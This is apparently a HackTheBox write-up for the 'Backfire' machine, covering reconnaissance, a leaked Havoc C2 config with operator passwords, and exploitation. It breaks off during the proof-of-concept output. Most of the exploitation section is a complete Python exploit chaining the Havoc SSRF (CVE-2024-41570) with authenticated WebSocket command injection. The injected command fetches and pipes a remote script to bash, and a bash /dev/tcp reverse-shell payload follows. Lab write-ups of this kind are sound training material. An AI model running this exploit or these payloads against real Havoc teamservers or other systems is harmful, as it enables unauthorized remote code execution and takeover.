<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>D3p4k-Backfire HTB</title>
    <link rel="icon" type="image/png" href="https://labs.hackthebox.com/storage/avatars/aa0a93908243c51fe21e691fc6571911.png">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link rel="stylesheet" href="../writeup.css">
    </head>
<body>
    <!-- Socials -->
    <div class="socials">
        <a href="https://www.linkedin.com" target="_blank"><i class="fab fa-linkedin"></i></a>
        <a href="https://app.hackthebox.com/profile/1979344" target="_blank">
            <svg style="width: 24px; height: 24px;" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <title>Hack The Box</title>
                <path d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z" fill="white"></path>
            </svg>
        </a>
        <a href="https://github.com" target="_blank"><i class="fab fa-github"></i></a>
    </div>

    <!-- Navbar -->
    <nav class="navbar navbar-expand-lg navbar-dark">
        <div class="container">
            <a class="navbar-brand" href="#">backfire - Hack the box</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item"><a class="nav-link" href="../../index.html">Home</a></li>
                    <li class="nav-item"><a class="nav-link" href="#Write-up">Write-up</a></li>
                </ul>
            </div>
        </div>
    </nav>

    <!-- Sections -->
    <div class="container">
        <section id="machine-info" class="section">   
            <h2>Machine Info:</h2>
            <p>To exploit the intranet port, we use <strong>Havoc&#x27;s SSRF</strong>, which triggers a <strong>WebSocket-based RCE</strong>. After forging the agent, we convert the protocol to WebSocket, allowing us to merge the two scripts effectively. This enables us to retrieve the <strong>user.txt</strong> flag and establish a persistent connection by writing the SSH key.</p><p>For <strong>root</strong> access, once the intranet port proxy is set up, we discover a vulnerability that bypasses authentication, enabling us to execute commands. Using this, we write the SSH key again for a persistent connection. Further exploration reveals that the <strong>iptables</strong> command has special permissions, which allows us to overwrite files. By leveraging this, we gain root access and retrieve the <strong>root.txt</strong> flag.</p>
            <img src="https://labs.hackthebox.com/storage/avatars/aa0a93908243c51fe21e691fc6571911.png">
        </section>

        <section id="enumeration" class="section">
    <h2>Enumeration:</h2>
    <h3>Nmap:</h3>
    <!-- Terminal Window: Rustscan Output -->
    <div class="terminal-window">
        <div class="window-header">
            <span class="button close"></span>
            <span class="button minimize"></span>
            <span class="button maximize"></span>
        </div>
        <div class="terminal">
            <pre><code>nmap -sC -sV 10.129.205.176 
# Nmap 7.95 scan initiated Wed Jan 22 18:50:06 2025 as: /usr/lib/nmap/nmap --privileged -sV -sC -oA Backfire 10.129.205.176
Nmap scan report for 10.129.205.176
Host is up (0.063s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 7d:6b:ba:b6:25:48:77:ac:3a:a2:ef:ae:f5:1d:98:c4 (ECDSA)
|_  256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519)
443/tcp  open     ssl/http nginx 1.22.1
|_http-server-header: nginx/1.22.1
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: commonName=127.0.0.1/stateOrProvinceName=Florida/countryName=US
| Subject Alternative Name: IP Address:127.0.0.1
| Not valid before: 2024-09-11T12:18:27
|_Not valid after:  2027-09-11T12:18:27
|_ssl-date: TLS randomness does not represent time
|_http-title: 404 Not Found
5000/tcp filtered upnp
8000/tcp open     http     nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-open-proxy: Proxy might be redirecting requests
| http-ls: Volume /
| SIZE  TIME               FILENAME
| 1559  17-Dec-2024 11:31  disable_tls.patch
| 875   17-Dec-2024 11:34  havoc.yaotl
|_
|_http-title: Index of /
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 22 18:50:25 2025 -- 1 IP address (1 host up) scanned in 18.78 seconds
</code></pre>
        </div>
    </div>
   <p>The Nmap scan of <strong>10.129.205.176</strong> reveals the following:</p><ul class="bulleted-list"><li style="list-style-type:disc"><strong>22/tcp</strong>: OpenSSH 9.2p1 (Debian 2+deb12u4), with ECDSA and ED25519 host keys.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc"><strong>443/tcp</strong>: nginx 1.22.1 with a self-signed SSL certificate (CN: 127.0.0.1, valid: 2024-09-11 to 2027-09-11). TLS ALPN supports HTTP/1.1, HTTP/1.0, and HTTP/0.9, serving a &quot;404 Not Found&quot; page.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc"><strong>5000/tcp</strong>: Filtered, possibly UPnP.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc"><strong>8000/tcp</strong>: nginx 1.22.1 serving a directory listing with two files:<ul class="bulleted-list"><li style="list-style-type:circle"><code>disable_tls.patch</code> (1559 bytes, 17-Dec-2024)</li></ul><ul class="bulleted-list"><li style="list-style-type:circle"><code>havoc.yaotl</code> (875 bytes, 17-Dec-2024).It might also act as an open proxy.</li></ul></li></ul><p>The scan highlights potential misconfigurations on ports 443 and 8000, warranting further investigation.</p><p>When accessing <strong><a href="http://backfire.htb:8000/">http://backfire.htb:8000</a></strong>, the server displays a directory listing containing two files: <strong>disable_tls.patch</strong> (1559 bytes, last modified on 17-Dec-2024) and <strong>havoc.yaotl</strong> (875 bytes, last modified on the same date). These files could provide valuable information or clues for further enumeration and exploitation.</p>
    <br><br>
    <img src="./web1.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
    <br><br>
    <h3>disable_tls.patch:</h3>
    <div class="terminal-window">
        <div class="window-header">
            <span class="button close"></span>
            <span class="button minimize"></span>
            <span class="button maximize"></span>
        </div>
        <div class="terminal">
    <pre><code>┌──(deepak㉿kali)-[~/HTB_Machines/Medium_linux/Backfire/8000_port]
└─$ cat disable_tls.patch 
Disable TLS for Websocket management port 40056, so I can prove that
sergej is not doing any work
Management port only allows local connections (we use ssh forwarding) so 
this will not compromize our teamserver

diff --git a/client/src/Havoc/Connector.cc b/client/src/Havoc/Connector.cc
index abdf1b5..6be76fb 100644
--- a/client/src/Havoc/Connector.cc
+++ b/client/src/Havoc/Connector.cc
@@ -8,12 +8,11 @@ Connector::Connector( Util::ConnectionInfo* ConnectionInfo )
 {
     Teamserver   = ConnectionInfo;
     Socket       = new QWebSocket();
-    auto Server  = &quot;wss://&quot; + Teamserver-&gt;Host + &quot;:&quot; + this-&gt;Teamserver-&gt;Port + &quot;/havoc/&quot;;
+    auto Server  = &quot;ws://&quot; + Teamserver-&gt;Host + &quot;:&quot; + this-&gt;Teamserver-&gt;Port + &quot;/havoc/&quot;;
     auto SslConf = Socket-&gt;sslConfiguration();
 
     /* ignore annoying SSL errors */
     SslConf.setPeerVerifyMode( QSslSocket::VerifyNone );
-    Socket-&gt;setSslConfiguration( SslConf );
     Socket-&gt;ignoreSslErrors();
 
     QObject::connect( Socket, &amp;QWebSocket::binaryMessageReceived, this, [&amp;]( const QByteArray&amp; Message )
diff --git a/teamserver/cmd/server/teamserver.go b/teamserver/cmd/server/teamserver.go
index 9d1c21f..59d350d 100644
--- a/teamserver/cmd/server/teamserver.go
+++ b/teamserver/cmd/server/teamserver.go
@@ -151,7 +151,7 @@ func (t *Teamserver) Start() {
 		}
 
 		// start the teamserver
-		if err = t.Server.Engine.RunTLS(Host+&quot;:&quot;+Port, certPath, keyPath); err != nil {
+		if err = t.Server.Engine.Run(Host+&quot;:&quot;+Port); err != nil {
 			logger.Error(&quot;Failed to start websocket: &quot; + err.Error())
 		}</code></pre>
 		</div>
 		</div>
 		<h3>havoc.yaotl:</h3>
 		<div class="terminal-window">
        <div class="window-header">
            <span class="button close"></span>
            <span class="button minimize"></span>
            <span class="button maximize"></span>
        </div>
        <div class="terminal"> <pre><code>                                                                                                                        
┌──(deepak㉿kali)-[~/HTB_Machines/Medium_linux/Backfire/8000_port]
└─$ cat havoc.yaotl 
Teamserver {
    Host = &quot;127.0.0.1&quot;
    Port = 40056

    Build {
        Compiler64 = &quot;data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc&quot;
        Compiler86 = &quot;data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc&quot;
        Nasm = &quot;/usr/bin/nasm&quot;
    }
}

Operators {
    user &quot;ilya&quot; {
        Password = &quot;CobaltStr1keSuckz!&quot;
    }

    user &quot;sergej&quot; {
        Password = &quot;1w4nt2sw1tch2h4rdh4tc2&quot;
    }
}

Demon {
    Sleep = 2
    Jitter = 15

    TrustXForwardedFor = false

    Injection {
        Spawn64 = &quot;C:\\Windows\\System32\\notepad.exe&quot;
        Spawn32 = &quot;C:\\Windows\\SysWOW64\\notepad.exe&quot;
    }
}

Listeners {
    Http {
        Name = &quot;Demon Listener&quot;
        Hosts = [
            &quot;backfire.htb&quot;
        ]
        HostBind = &quot;127.0.0.1&quot; 
        PortBind = 8443
        PortConn = 8443
        HostRotation = &quot;round-robin&quot;
        Secure = true
    }
}</code></pre>
</div>
</div>
<p>It looks like a Havoc server is opened: <a href="https://github.com/HavocFramework/Havoc">Havoc Framework/Havoc: The Havoc Framework</a></p><p>And the username and password for the connection are exposed, but I can&#x27;t connect successfully after installing Havoc</p>
</section>

<section id="Exploitation" class="section">
<h2>Exploitation:</h2>
<h3>Havoc RCE:</h3>
<br><br>
<img src="./web2.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
<br><br>
<p>The two scripts have complementary functionalities that, when combined, can establish a robust exploitation chain. Here&#x27;s an overview of their roles and the process to integrate them:</p>
<h3>Main Functionality of the First Script:</h3><ol type="1" class="numbered-list" start="1"><li><strong>Forged Agent Registration</strong>: Sends a fake agent registration request to the target server to trigger specific actions, such as opening a socket.</li></ol><ol type="1" class="numbered-list" start="2"><li><strong>Socket Control</strong>: Commands the server to open a socket for remote connections.</li></ol><ol type="1"  class="numbered-list" start="3"><li><strong>Socket Data Writing</strong>: Writes data to the open socket, enabling further interaction.</li></ol><ol type="1"  class="numbered-list" start="4"><li><strong>Socket Data Reading</strong>: Retrieves data from the server, potentially exposing sensitive information like IP addresses.</li></ol><h3>Main Functionality of the Second Script:</h3><ol type="1" class="numbered-list" start="1"><li><strong>WebSocket Connection</strong>: Establishes a WebSocket connection (using <code>wss://</code>) with the remote server.</li></ol><ol type="1" class="numbered-list" start="2"><li><strong>Authentication</strong>: Logs in using a username and SHA3-256 encrypted password.</li></ol><ol type="1" class="numbered-list" start="3"><li><strong>Listener Creation</strong>: Requests the creation of a listener on the server to establish a &quot;demon agent.&quot;</li></ol><ol type="1" class="numbered-list" start="4"><li><strong>Remote Command Execution (RCE)</strong>: Injects malicious payloads to exploit command injection vulnerabilities and execute commands remotely.</li></ol><h3>Combining the Two Scripts:</h3><p>By combining the two scripts, you can:</p><ol type="1"  class="numbered-list" start="1"><li><strong>Register a Forged Agent</strong> using the first script to prepare the target for interaction.</li></ol><ol type="1" class="numbered-list" start="2"><li><strong>Upgrade the Communication Protocol</strong> from HTTP to WebSocket after agent registration.</li></ol><ol type="1" class="numbered-list" start="3"><li><strong>Authenticate</strong> with the WebSocket protocol and use it to inject commands.</li></ol><ol type="1" class="numbered-list" start="4"><li><strong>Leverage RCE</strong> to execute commands and establish full control.</li></ol><p>The protocol upgrade involves sending an HTTP header to switch from HTTP to WebSocket. A typical upgrade header looks like this:</p>
<div class="terminal-window">
        <div class="window-header">
            <span class="button close"></span>
            <span class="button minimize"></span>
            <span class="button maximize"></span>
        </div>
        <div class="terminal">
<pre><code>GET / HTTP/1.1
Host: target.server.com
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Key: base64encodedkey
Sec-WebSocket-Version: 13
</code></pre>
</div>
</div>
<h3>Key Steps:</h3><ol type="1" class="numbered-list" start="1"><li>Use the first script to trigger the server to open a socket and perform initial interactions.</li></ol><ol type="1" class="numbered-list" start="2"><li>Upgrade the connection to WebSocket using the appropriate headers.</li></ol><ol type="1" class="numbered-list" start="3"><li>Authenticate and inject the second script&#x27;s malicious payloads for command execution.</li></ol><p>This combined approach maximizes the exploitation potential by chaining forged registration, protocol upgrades, and remote code execution.</p><p>
<br><br>
</p><h3>Custom Exploit:CVE-2024-41570</h3>
<div class="terminal-window">
        <div class="window-header">
            <span class="button close"></span>
            <span class="button minimize"></span>
            <span class="button maximize"></span>
        </div>
        <div class="terminal">
<pre><code>import os
import json
import hashlib
import binascii
import random
import requests
import argparse
import urllib3
from Crypto.Cipher import AES
from Crypto.Util import Counter

urllib3.disable_warnings()

key_bytes = 32

def decrypt(key, iv, ciphertext):
    if len(key) &lt;= key_bytes:
        for _ in range(len(key), key_bytes):
            key += b&quot;0&quot;

    assert len(key) == key_bytes

    iv_int = int(binascii.hexlify(iv), 16)
    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)

    plaintext = aes.decrypt(ciphertext)
    return plaintext


def int_to_bytes(value, length=4, byteorder=&quot;big&quot;):
    return value.to_bytes(length, byteorder)


def encrypt(key, iv, plaintext):
    if len(key) &lt;= key_bytes:
        for x in range(len(key), key_bytes):
            key = key + b&quot;0&quot;

        assert len(key) == key_bytes

        iv_int = int(binascii.hexlify(iv), 16)
        ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
        aes = AES.new(key, AES.MODE_CTR, counter=ctr)

        ciphertext = aes.encrypt(plaintext)
        return ciphertext

def register_agent(hostname, username, domain_name, internal_ip, process_name, process_id):
    command = b&quot;\x00\x00\x00\x63&quot;
    request_id = b&quot;\x00\x00\x00\x01&quot;
    demon_id = agent_id

    hostname_length = int_to_bytes(len(hostname))
    username_length = int_to_bytes(len(username))
    domain_name_length = int_to_bytes(len(domain_name))
    internal_ip_length = int_to_bytes(len(internal_ip))
    process_name_length = int_to_bytes(len(process_name) - 6)

    data = b&quot;\xab&quot; * 100

    header_data = command + request_id + AES_Key + AES_IV + demon_id + hostname_length + hostname + username_length + username + domain_name_length + domain_name + internal_ip_length + internal_ip + process_name_length + process_name + process_id + data

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, &#x27;big&#x27;)
    agent_header = size_bytes + magic + agent_id
    print(agent_header + header_data)
    print(&quot;[***] Trying to register agent...&quot;)
    r = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)
    if r.status_code == 200:
        print(&quot;[***] Success!&quot;)
    else:
        print(f&quot;[!!!] Failed to register agent - {r.status_code} {r.text}&quot;)


def open_socket(socket_id, target_address, target_port):
    command = b&quot;\x00\x00\x09\xec&quot;
    request_id = b&quot;\x00\x00\x00\x02&quot;
    subcommand = b&quot;\x00\x00\x00\x10&quot;
    sub_request_id = b&quot;\x00\x00\x00\x03&quot;
    local_addr = b&quot;\x22\x22\x22\x22&quot;
    local_port = b&quot;\x33\x33\x33\x33&quot;

    forward_addr = b&quot;&quot;
    for octet in target_address.split(&quot;.&quot;)[::-1]:
        forward_addr += int_to_bytes(int(octet), length=1)

    forward_port = int_to_bytes(target_port)

    package = subcommand + socket_id + local_addr + local_port + forward_addr + forward_port
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, &#x27;big&#x27;)
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data

    print(&quot;[***] Trying to open socket on the teamserver...&quot;)
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print(&quot;[***] Success!&quot;)
    else:
        print(f&quot;[!!!] Failed to open socket on teamserver - {r.status_code} {r.text}&quot;)


def write_socket(socket_id, data):
    command = b&quot;\x00\x00\x09\xec&quot;
    request_id = b&quot;\x00\x00\x00\x08&quot;
    subcommand = b&quot;\x00\x00\x00\x11&quot;
    sub_request_id = b&quot;\x00\x00\x00\xa1&quot;
    socket_type = b&quot;\x00\x00\x00\x03&quot;
    success = b&quot;\x00\x00\x00\x01&quot;

    data_length = int_to_bytes(len(data))

    package = subcommand + socket_id + socket_type + success + data_length + data
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, &#x27;big&#x27;)
    agent_header = size_bytes + magic + agent_id
    post_data = agent_header + header_data
    print(post_data)
    print(&quot;[***] Trying to write to the socket&quot;)
    r = requests.post(teamserver_listener_url, data=post_data, headers=headers, verify=False)
    if r.status_code == 200:
        print(&quot;[***] Success!&quot;)
    else:
        print(f&quot;[!!!] Failed to write data to the socket - {r.status_code} {r.text}&quot;)


def read_socket(socket_id):
    command = b&quot;\x00\x00\x00\x01&quot;
    request_id = b&quot;\x00\x00\x00\x09&quot;

    header_data = command + request_id

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, &#x27;big&#x27;)
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data

    print(&quot;[***] Trying to poll teamserver for socket output...&quot;)
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print(&quot;[***] Read socket output successfully!&quot;)
    else:
        print(f&quot;[!!!] Failed to read socket output - {r.status_code} {r.text}&quot;)
        return &quot;&quot;

    command_id = int.from_bytes(r.content[0:4], &quot;little&quot;)
    request_id = int.from_bytes(r.content[4:8], &quot;little&quot;)
    package_size = int.from_bytes(r.content[8:12], &quot;little&quot;)
    enc_package = r.content[12:]

    return decrypt(AES_Key, AES_IV, enc_package)[12:]


def create_websocket_request(host, port):
    request = (
        f&quot;GET /havoc/ HTTP/1.1\r\n&quot;
        f&quot;Host: {host}:{port}\r\n&quot;
        f&quot;Upgrade: websocket\r\n&quot;
        f&quot;Connection: Upgrade\r\n&quot;
        f&quot;Sec-WebSocket-Key: 5NUvQyzkv9bpu376gKd2Lg==\r\n&quot;
        f&quot;Sec-WebSocket-Version: 13\r\n&quot;
        f&quot;\r\n&quot;
    ).encode()
    return request


def build_websocket_frame(payload):
    payload_bytes = payload.encode(&quot;utf-8&quot;)
    frame = bytearray()
    frame.append(0x81)
    payload_length = len(payload_bytes)
    if payload_length &lt;= 125:
        frame.append(0x80 | payload_length)
    elif payload_length &lt;= 65535:
        frame.append(0x80 | 126)
        frame.extend(payload_length.to_bytes(2, byteorder=&quot;big&quot;))
    else:
        frame.append(0x80 | 127)
        frame.extend(payload_length.to_bytes(8, byteorder=&quot;big&quot;))

    masking_key = os.urandom(4)
    frame.extend(masking_key)
    masked_payload = bytearray(byte ^ masking_key[i % 4] for i, byte in enumerate(payload_bytes))
    frame.extend(masked_payload)

    return frame


parser = argparse.ArgumentParser()
parser.add_argument(&quot;-t&quot;, &quot;--target&quot;, help=&quot;The listener target in URL format&quot;, required=True)
parser.add_argument(&quot;-i&quot;, &quot;--ip&quot;, help=&quot;The IP to open the socket with&quot;, required=True)
parser.add_argument(&quot;-p&quot;, &quot;--port&quot;, help=&quot;The port to open the socket with&quot;, required=True)
parser.add_argument(&quot;-A&quot;, &quot;--user-agent&quot;, help=&quot;The User-Agent for the spoofed agent&quot;, default=&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&quot;)
parser.add_argument(&quot;-H&quot;, &quot;--hostname&quot;, help=&quot;The hostname for the spoofed agent&quot;, default=&quot;DESKTOP-7F61JT1&quot;)
parser.add_argument(&quot;-u&quot;, &quot;--username&quot;, help=&quot;The username for the spoofed agent&quot;, default=&quot;Administrator&quot;)
parser.add_argument(&quot;-d&quot;, &quot;--domain-name&quot;, help=&quot;The domain name for the spoofed agent&quot;, default=&quot;ECORP&quot;)
parser.add_argument(&quot;-n&quot;, &quot;--process-name&quot;, help=&quot;The process name for the spoofed agent&quot;, default=&quot;msedge.exe&quot;)
parser.add_argument(&quot;-ip&quot;, &quot;--internal-ip&quot;, help=&quot;The internal ip for the spoofed agent&quot;, default=&quot;10.1.33.7&quot;)

args = parser.parse_args()

magic = b&quot;\xde\xad\xbe\xef&quot;
teamserver_listener_url = args.target
headers = {
    &quot;User-Agent&quot;: args.user_agent
}
agent_id = int_to_bytes(random.randint(100000, 1000000))
AES_Key = b&quot;\x00&quot; * 32
AES_IV = b&quot;\x00&quot; * 16
hostname = bytes(args.hostname, encoding=&quot;utf-8&quot;)
username = bytes(args.username, encoding=&quot;utf-8&quot;)
domain_name = bytes(args.domain_name, encoding=&quot;utf-8&quot;)
internal_ip = bytes(args.internal_ip, encoding=&quot;utf-8&quot;)
process_name = args.process_name.encode(&quot;utf-16le&quot;)
process_id = int_to_bytes(random.randint(1000, 5000))

register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)

socket_id = b&quot;\x11\x11\x11\x11&quot;
open_socket(socket_id, args.ip, int(args.port))

USER = &quot;ilya&quot;
PASSWORD = &quot;CobaltStr1keSuckz!&quot;
host = &quot;127.0.0.1&quot;
port = 40056
websocket_request = create_websocket_request(host, port)
write_socket(socket_id, websocket_request)
response = read_socket(socket_id)
payload = {&quot;Body&quot;: {&quot;Info&quot;: {&quot;Password&quot;: hashlib.sha3_256(PASSWORD.encode()).hexdigest(), &quot;User&quot;: USER}, &quot;SubEvent&quot;: 3}, &quot;Head&quot;: {&quot;Event&quot;: 1, &quot;OneTime&quot;: &quot;&quot;, &quot;Time&quot;: &quot;18:40:17&quot;, &quot;User&quot;: USER}}
payload_json = json.dumps(payload)
frame = build_websocket_frame(payload_json)
write_socket(socket_id, frame)
response = read_socket(socket_id)

payload = {&quot;Body&quot;:{&quot;Info&quot;:{&quot;Headers&quot;:&quot;&quot;,&quot;HostBind&quot;:&quot;0.0.0.0&quot;,&quot;HostHeader&quot;:&quot;&quot;,&quot;HostRotation&quot;:&quot;round-robin&quot;,&quot;Hosts&quot;:&quot;0.0.0.0&quot;,&quot;Name&quot;:&quot;abc&quot;,&quot;PortBind&quot;:&quot;443&quot;,&quot;PortConn&quot;:&quot;443&quot;,&quot;Protocol&quot;:&quot;Https&quot;,&quot;Proxy Enabled&quot;:&quot;false&quot;,&quot;Secure&quot;:&quot;true&quot;,&quot;Status&quot;:&quot;online&quot;,&quot;Uris&quot;:&quot;&quot;,&quot;UserAgent&quot;:&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&quot;},&quot;SubEvent&quot;:1},&quot;Head&quot;:{&quot;Event&quot;:2,&quot;OneTime&quot;:&quot;&quot;,&quot;Time&quot;:&quot;08:39:18&quot;,&quot;User&quot;: USER}}
payload_json = json.dumps(payload)
frame = build_websocket_frame(payload_json)
write_socket(socket_id, frame)
response = read_socket(socket_id)

cmd = &quot;curl http://10.10.14.33:8080/payload.sh | bash&quot; 
injection = &quot;&quot;&quot; \\\\\\\&quot; -mbla; &quot;&quot;&quot; + cmd + &quot;&quot;&quot; 1&gt;&amp;2 &amp;&amp; false #&quot;&quot;&quot;
payload = {&quot;Body&quot;: {&quot;Info&quot;: {&quot;AgentType&quot;: &quot;Demon&quot;, &quot;Arch&quot;: &quot;x64&quot;, &quot;Config&quot;: &quot;{\n    \&quot;Amsi/Etw Patch\&quot;: \&quot;None\&quot;,\n    \&quot;Indirect Syscall\&quot;: false,\n    \&quot;Injection\&quot;: {\n        \&quot;Alloc\&quot;: \&quot;Native/Syscall\&quot;,\n        \&quot;Execute\&quot;: \&quot;Native/Syscall\&quot;,\n        \&quot;Spawn32\&quot;: \&quot;C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\&quot;,\n        \&quot;Spawn64\&quot;: \&quot;C:\\\\Windows\\\\System32\\\\notepad.exe\&quot;\n    },\n    \&quot;Jitter\&quot;: \&quot;0\&quot;,\n    \&quot;Proxy Loading\&quot;: \&quot;None (LdrLoadDll)\&quot;,\n    \&quot;Service Name\&quot;:\&quot;&quot; + injection + &quot;\&quot;,\n    \&quot;Sleep\&quot;: \&quot;2\&quot;,\n    \&quot;Sleep Jmp Gadget\&quot;: \&quot;None\&quot;,\n    \&quot;Sleep Technique\&quot;: \&quot;WaitForSingleObjectEx\&quot;,\n    \&quot;Stack Duplication\&quot;: false\n}\n&quot;, &quot;Format&quot;: &quot;Windows Service Exe&quot;, &quot;Listener&quot;: &quot;abc&quot;}, &quot;SubEvent&quot;: 2}, &quot;Head&quot;: {
&quot;Event&quot;: 5, &quot;OneTime&quot;: &quot;true&quot;, &quot;Time&quot;: &quot;18:39:04&quot;, &quot;User&quot;: USER}}
payload_json = json.dumps(payload)
frame = build_websocket_frame(payload_json)
write_socket(socket_id, frame)
response = read_socket(socket_id)
</code></pre>
</div>
</div>
<h3>Steps to Run the Exploit</h3><ul class="bulleted-list"><li style="list-style-type:disc">Create a reverse shell payload script.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">Host the payload using a Python HTTP server.</li></ul>
<div class="terminal-window">
        <div class="window-header">
            <span class="button close"></span>
            <span class="button minimize"></span>
            <span class="button maximize"></span>
        </div>
        <div class="terminal">
<pre><code>!/bin/bash
bash -i &gt;&amp; /dev/tcp/10.10.14.33/4444 0&gt;&amp;1</code></pre>
</div>
</div>
<ul class="bulleted-list"><li style="list-style-type:disc">Set up a Netcat listener to catch the reverse shell.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">Use the exploit to trigger the target to download and execute the payload.</li></ul><ul class="bulleted-list"><li style="list-style-type:disc">Catch the reverse shell in the Netcat listener.</li></ul>
<br><br>
<h3>Proof-of-concept:</h3>
<div class="terminal-window">
        <div class="window-header">
            <span class="button close"></span>
            <span class="button minimize"></span>
            <span class="button maximize"></span>
        </div>
        <div class="terminal">
<pre><code>python3 havoc.py -t https://10.129.205.176/ -i 127.0.0.1 -p 40056
b&#x27;\x00\x00\x01\x02\xde\xad\xbe\xef\x00\x06P\xd9\x00\x00\x00c\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06P\xd9\x00\x00\x00\x0fDESKTOP-7F61JT1\x00\x00\x00\rAdministrator\x00\x00\x00\x05ECORP\x00\x00\x00\t10.1.33.7\x00\x00\x00\x0em\x00s\x00e\x00d\x00g\x00e\x00.\x00e\x00x\x00e\x00\x00\x00\x06\xda\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab&#x27;
[***] Trying to register agent...
[***] Success!
[***] Trying to open socket on the teamserver...
[***] Success!
